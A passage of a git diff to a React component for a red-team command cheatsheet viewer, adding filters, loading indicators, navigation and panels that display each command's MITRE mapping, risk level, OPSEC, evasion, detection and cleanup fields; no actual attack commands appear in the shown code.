+                      {filterMitre && (
+                        <span className="px-2 py-1 bg-zinc-800 rounded-md">MITRE Mapped</span>
+                      )}
+                    </div>
+                    <button
+                      onClick={() => {
+                        setFilterRiskLevel('');
+                        setFilterPlatform('');
+                        setFilterMitre(false);
+                      }}
+                      className="text-xs text-zinc-500 hover:text-zinc-300 underline"
+                    >
+                      Clear all filters
+                    </button>
+                  </div>
+                </div>
+              )}
+            </motion.div>
+          )}
         </motion.div>
+
+        {/* Results Summary */}
+        {(searchTerm || filterRiskLevel || filterPlatform || filterMitre) && (
+          <motion.div
+            initial={{ opacity: 0, y: 10 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="mb-6 text-center"
+          >
+            <div className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-900/70 border border-zinc-800 rounded-lg text-sm">
+              <Search className="w-4 h-4 text-zinc-400" />
+              <span className="text-zinc-300">
+                Found {filteredCategories.reduce((total, cat) => 
+                  total + cat.subcategories.reduce((subTotal, sub) => subTotal + sub.commands.length, 0), 0
+                )} commands
+              </span>
+              {(filterRiskLevel || filterPlatform || filterMitre) && (
+                <span className="text-zinc-500">with active filters</span>
+              )}
+            </div>
+          </motion.div>
+        )}
 
         {/* Categories */}
         <motion.div
+          ref={categoriesRef}
           initial={{ opacity: 0 }}
           animate={{ opacity: 1 }}
           transition={{ duration: 0.5, delay: 0.2 }}
@@ -3221,18 +5218,24 @@ const RedTeamCheatsheetWrapper = () => {
               transition={{ duration: 0.3, delay: 0.1 + index * 0.05 }}
               className={`cursor-pointer rounded-lg border backdrop-blur-sm p-4 transition-all duration-300 hover:shadow-lg ${
                 selectedCategory === category.name
-                  ? 'bg-blue-900/20 border-blue-700/50'
+                  ? isLoadingCategory 
+                    ? 'bg-blue-900/30 border-blue-600/60 animate-pulse'
+                    : 'bg-blue-900/20 border-blue-700/50'
                   : 'bg-zinc-900/70 border-zinc-800/50 hover:bg-zinc-800/50'
               }`}
               onClick={() => handleCategoryClick(category.name)}
             >
               <div className="flex items-center gap-3">
-                <div className={`p-2 rounded-lg ${
+                <div className={`p-2 rounded-lg relative ${
                   selectedCategory === category.name
                     ? 'bg-blue-900/50 text-blue-400'
                     : 'bg-zinc-800/80 text-zinc-400'
                 }`}>
-                  {category.icon}
+                  {selectedCategory === category.name && isLoadingCategory ? (
+                    <div className="w-5 h-5 border-2 border-blue-400/30 border-t-blue-400 rounded-full animate-spin"></div>
+                  ) : (
+                    category.icon
+                  )}
                 </div>
                 <div>
                   <h3 className="font-semibold text-lg">{category.name}</h3>
@@ -3247,8 +5250,50 @@ const RedTeamCheatsheetWrapper = () => {
           ))}
         </motion.div>
 
+        {/* Selection breadcrumb */}
+        {selectedCategory && !searchTerm && (
+          <motion.div
+            initial={{ opacity: 0, y: -10 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.4 }}
+            className="mt-6 mb-4"
+          >
+            <div className="flex items-center justify-center gap-2 text-sm">
+              <div className="flex items-center gap-2 px-4 py-2 bg-blue-900/20 border border-blue-700/30 rounded-full">
+                <span className="text-zinc-400">Selected:</span>
+                <span className="text-blue-400 font-medium">{selectedCategory}</span>
+                {selectedSubcategory && (
+                  <>
+                    <ChevronRight className="h-3 w-3 text-zinc-500" />
+                    <span className="text-blue-300">{selectedSubcategory}</span>
+                  </>
+                )}
+              </div>
+            </div>
+            
+            {/* Animated scroll indicator */}
+            {!isLoadingCategory && (
+              <motion.div
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                transition={{ duration: 0.6, delay: 0.3 }}
+                className="flex flex-col items-center mt-4"
+              >
+                <motion.div
+                  animate={{ y: [0, 8, 0] }}
+                  transition={{ duration: 1.5, repeat: Infinity, ease: "easeInOut" }}
+                  className="text-blue-400/60"
+                >
+                  <ChevronDown className="h-5 w-5" />
+                </motion.div>
+                <span className="text-xs text-zinc-500 mt-1">Scroll down to see techniques</span>
+              </motion.div>
+            )}
+          </motion.div>
+        )}
+
         {/* Main Content Area */}
-        <div className="mt-8">
+        <div ref={resultsRef} className="mt-8">
           {searchTerm || selectedCategory ? (
             <div className="flex flex-col lg:flex-row gap-6">
               {/* Display subcategories when a category is selected */}
@@ -3325,8 +5370,24 @@ const RedTeamCheatsheetWrapper = () => {
                   ))
                 )}
                 
+                {/* Loading indicator for category */}
+                {selectedCategory && !searchTerm && isLoadingCategory && (
+                  <motion.div
+                    initial={{ opacity: 0 }}
+                    animate={{ opacity: 1 }}
+                    transition={{ duration: 0.3 }}
+                    className="flex items-center justify-center py-12"
+                  >
+                    <div className="text-center">
+                      <div className="w-8 h-8 border-2 border-blue-400/30 border-t-blue-400 rounded-full animate-spin mx-auto mb-4"></div>
+                      <p className="text-blue-400 font-medium">Loading {selectedCategory} techniques...</p>
+                      <p className="text-zinc-400 text-sm mt-1">Preparing command arsenal</p>
+                    </div>
+                  </motion.div>
+                )}
+                
                 {/* When a category is selected without search, show that category */}
-                {selectedCategory && !searchTerm && (
+                {selectedCategory && !searchTerm && !isLoadingCategory && (
                   <div>
                     {/* When no subcategory is selected, show brief description of all subcategories */}
                     {!selectedSubcategory && (
@@ -3386,7 +5447,7 @@ const RedTeamCheatsheetWrapper = () => {
                           </div>
                         </div>
                         
-                        <div className="space-y-3">
+                        <div className="space-y-3 commands-section">
                           {renderCommands(
                             cheatsheetData
                               .find(c => c.name === selectedCategory)
@@ -3435,6 +5496,30 @@ const RedTeamCheatsheetWrapper = () => {
             </motion.div>
           )}
         </div>
+
+        {/* Scroll to top button */}
+        {selectedCategory && !isLoadingCategory && (
+          <motion.button
+            initial={{ opacity: 0, scale: 0.8 }}
+            animate={{ opacity: 1, scale: 1 }}
+            exit={{ opacity: 0, scale: 0.8 }}
+            transition={{ duration: 0.3 }}
+            onClick={() => {
+              if (categoriesRef.current) {
+                categoriesRef.current.scrollIntoView({ 
+                  behavior: 'smooth', 
+                  block: 'start',
+                  inline: 'nearest'
+                });
+              }
+            }}
+            className="fixed bottom-6 right-6 p-3 bg-blue-600 hover:bg-blue-700 text-white rounded-full shadow-lg transition-colors z-40 flex items-center gap-2"
+            title="Back to categories"
+          >
+            <ChevronRight className="h-4 w-4 rotate-[-90deg]" />
+            <span className="hidden sm:inline text-sm">Back to Categories</span>
+          </motion.button>
+        )}
 
         {/* Notification for copied command */}
         {copiedCommand && (
@@ -3491,11 +5576,49 @@ const RedTeamCheatsheetWrapper = () => {
               </div>
               <p className="text-sm text-zinc-400 mt-1">{cmd.description}</p>
               
-              {/* Show small indicator if example is available */}
-              {cmd.example && !isExpanded && (
-                <div className="flex items-center gap-1 mt-1">
+              {/* Show indicators for available metadata */}
+              {!isExpanded && (
+                <div className="flex items-center gap-3 mt-2 flex-wrap">
+                  {cmd.example && (
+                    <div className="flex items-center gap-1">
                   <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
-                  <span className="text-xs text-green-500/80">Example available</span>
+                      <span className="text-xs text-green-500/80">Example</span>
+                    </div>
+                  )}
+                  {cmd.mitreTechnique && (
+                    <div className="flex items-center gap-1">
+                      <div className="h-1.5 w-1.5 rounded-full bg-red-500"></div>
+                      <span className="text-xs text-red-500/80">MITRE ATT&CK</span>
+                    </div>
+                  )}
+                  {cmd.opsecNotes && (
+                    <div className="flex items-center gap-1">
+                      <div className="h-1.5 w-1.5 rounded-full bg-yellow-500"></div>
+                      <span className="text-xs text-yellow-500/80">OPSEC</span>
+                    </div>
+                  )}
+                  {cmd.evasionTips && (
+                    <div className="flex items-center gap-1">
+                      <div className="h-1.5 w-1.5 rounded-full bg-cyan-500"></div>
+                      <span className="text-xs text-cyan-500/80">Evasion</span>
+                    </div>
+                  )}
+                  {cmd.riskLevel && (
+                    <div className="flex items-center gap-1">
+                      <div className={`h-1.5 w-1.5 rounded-full ${
+                        cmd.riskLevel === 'Critical' ? 'bg-red-500' :
+                        cmd.riskLevel === 'High' ? 'bg-orange-500' :
+                        cmd.riskLevel === 'Medium' ? 'bg-yellow-500' :
+                        'bg-green-500'
+                      }`}></div>
+                      <span className={`text-xs ${
+                        cmd.riskLevel === 'Critical' ? 'text-red-500/80' :
+                        cmd.riskLevel === 'High' ? 'text-orange-500/80' :
+                        cmd.riskLevel === 'Medium' ? 'text-yellow-500/80' :
+                        'text-green-500/80'
+                      }`}>{cmd.riskLevel} Risk</span>
+                    </div>
+                  )}
                 </div>
               )}
             </div>
@@ -3504,8 +5627,10 @@ const RedTeamCheatsheetWrapper = () => {
             </div>
           </div>
           
-          {isExpanded && cmd.example && (
-            <div className="px-3 pb-3 pt-1">
+          {isExpanded && (
+            <div className="px-3 pb-3 pt-1 space-y-3">
+              {/* Example */}
+              {cmd.example && (
               <div className="text-sm">
                 <div className="text-green-500 mb-1 flex items-center gap-1">
                   <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
@@ -3522,6 +5647,144 @@ const RedTeamCheatsheetWrapper = () => {
                   </button>
                 </div>
               </div>
+              )}
+
+              {/* Metadata Grid */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
+                {/* MITRE ATT&CK */}
+                {cmd.mitreTechnique && (
+                  <div className="bg-red-500/10 border border-red-500/20 rounded-md p-2">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Target className="h-3 w-3 text-red-400" />
+                      <span className="text-red-400 font-medium">MITRE ATT&CK</span>
+                    </div>
+                    <div className="text-zinc-300 text-xs">
+                      {cmd.mitreTechnique} {cmd.mitreId && `(${cmd.mitreId})`}
+                    </div>
+                  </div>
+                )}
+
+                {/* Risk Level */}
+                {cmd.riskLevel && (
+                  <div className={`border rounded-md p-2 ${
+                    cmd.riskLevel === 'Critical' ? 'bg-red-500/10 border-red-500/20' :
+                    cmd.riskLevel === 'High' ? 'bg-orange-500/10 border-orange-500/20' :
+                    cmd.riskLevel === 'Medium' ? 'bg-yellow-500/10 border-yellow-500/20' :
+                    'bg-green-500/10 border-green-500/20'
+                  }`}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <AlertTriangle className={`h-3 w-3 ${
+                        cmd.riskLevel === 'Critical' ? 'text-red-400' :
+                        cmd.riskLevel === 'High' ? 'text-orange-400' :
+                        cmd.riskLevel === 'Medium' ? 'text-yellow-400' :
+                        'text-green-400'
+                      }`} />
+                      <span className={`font-medium ${
+                        cmd.riskLevel === 'Critical' ? 'text-red-400' :
+                        cmd.riskLevel === 'High' ? 'text-orange-400' :
+                        cmd.riskLevel === 'Medium' ? 'text-yellow-400' :
+                        'text-green-400'
+                      }`}>Risk Level</span>
+                    </div>
+                    <div className="text-zinc-300 text-xs">{cmd.riskLevel}</div>
+                  </div>
+                )}
+
+                {/* Platform Support */}
+                {cmd.platform && cmd.platform.length > 0 && (
+                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-md p-2">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Cpu className="h-3 w-3 text-blue-400" />
+                      <span className="text-blue-400 font-medium">Platform</span>
+                    </div>
+                    <div className="flex flex-wrap gap-1">
+                      {cmd.platform.map((platform, idx) => (
+                        <span key={idx} className="text-xs bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
+                          {platform}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {/* Prerequisites */}
+                {cmd.prerequisites && (
+                  <div className="bg-purple-500/10 border border-purple-500/20 rounded-md p-2">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Key className="h-3 w-3 text-purple-400" />
+                      <span className="text-purple-400 font-medium">Prerequisites</span>
+                    </div>
+                    <div className="text-zinc-300 text-xs">{cmd.prerequisites}</div>
+                  </div>
+                )}
+              </div>
+
+              {/* OPSEC Notes */}
+              {cmd.opsecNotes && (
+                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-md p-2">
+                  <div className="flex items-center gap-1 mb-1">
+                    <Eye className="h-3 w-3 text-yellow-400" />
+                    <span className="text-yellow-400 font-medium">OPSEC Notes</span>
+                  </div>
+                  <div className="text-zinc-300 text-xs">{cmd.opsecNotes}</div>
+                </div>
+              )}
+
+              {/* Evasion Tips */}
+              {cmd.evasionTips && (
+                <div className="bg-cyan-500/10 border border-cyan-500/20 rounded-md p-2">
+                  <div className="flex items-center gap-1 mb-1">
+                    <Skull className="h-3 w-3 text-cyan-400" />
+                    <span className="text-cyan-400 font-medium">Evasion Tips</span>
+                  </div>
+                  <div className="text-zinc-300 text-xs">{cmd.evasionTips}</div>
+                </div>
+              )}
+
+              {/* Detection Methods */}
+              {cmd.detectionMethods && (
+                <div className="bg-orange-500/10 border border-orange-500/20 rounded-md p-2">
+                  <div className="flex items-center gap-1 mb-1">
+                    <Activity className="h-3 w-3 text-orange-400" />
+                    <span className="text-orange-400 font-medium">Detection Methods</span>
+                  </div>
+                  <div className="text-zinc-300 text-xs">{cmd.detectionMethods}</div>
+                </div>
+              )}
+
+              {/* Cleanup */}
+              {cmd.cleanup && (
+                <div className="bg-green-500/10 border border-green-500/20 rounded-md p-2">
+                  <div className="flex items-center gap-1 mb-1">
+                    <Trash2 className="h-3 w-3 text-green-400" />
+                    <span className="text-green-400 font-medium">Cleanup</span>
+                  </div>
+                  <div className="text-zinc-300 text-xs">{cmd.cleanup}</div>
+                </div>
+              )}
+
+              {/* References */}
+              {cmd.references && cmd.references.length > 0 && (
+                <div className="bg-indigo-500/10 border border-indigo-500/20 rounded-md p-2">
+                  <div className="flex items-center gap-1 mb-1">
+                    <ExternalLink className="h-3 w-3 text-indigo-400" />
+                    <span className="text-indigo-400 font-medium">References</span>
+                  </div>
+                  <div className="space-y-1">
+                    {cmd.references.map((ref, idx) => (
+                      <a 
+                        key={idx}
+                        href={ref}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        className="text-xs text-indigo-300 hover:text-indigo-200 underline block"
+                      >
+                        {ref}
+                      </a>
+                    ))}
+                  </div>
+                </div>
+              )}
             </div>
           )}
         </motion.div>
